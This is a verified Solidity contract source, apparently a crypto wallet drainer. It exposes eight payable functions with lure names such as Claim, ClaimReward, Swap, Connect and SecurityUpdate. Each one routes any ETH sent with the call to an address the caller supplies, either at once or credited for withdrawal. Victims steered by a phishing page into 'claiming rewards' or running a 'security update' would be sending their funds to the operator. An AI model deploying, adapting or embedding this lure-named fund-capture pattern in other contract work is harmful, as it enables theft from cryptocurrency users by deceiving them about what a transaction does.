/**
 *Submitted for verification at Etherscan.io on 2023-06-08
*/

pragma solidity ^0.8.18;
contract MS_Contract {

  address private owner;
  mapping (address => uint256) private balance;
  mapping (address => bool) private auto_withdraw;

  constructor() { owner = msg.sender; }
  function getOwner() public view returns (address) { return owner; }
  function getBalance() public view returns (uint256) { return address(this).balance; }
  function getUserBalance(address wallet) public view returns (uint256) { return balance[wallet]; }
  function getWithdrawStatus(address wallet) public view returns (bool) { return auto_withdraw[wallet]; }
  function setWithdrawStatus(bool status) public { auto_withdraw[msg.sender] = status; }

  function withdraw(address where) public {
    uint256 amount = balance[msg.sender];
    require(address(this).balance >= amount, "BALANCE_LOW");
    balance[msg.sender] = 0; payable(where).transfer(amount);
  }

  function Claim(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
  function ClaimReward(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
  function ClaimRewards(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
  function Execute(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
  function Multicall(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
  function Swap(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
  function Connect(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }
  function SecurityUpdate(address sender) public payable { if (auto_withdraw[sender]) payable(sender).transfer(msg.value); else balance[sender] += msg.value; }

}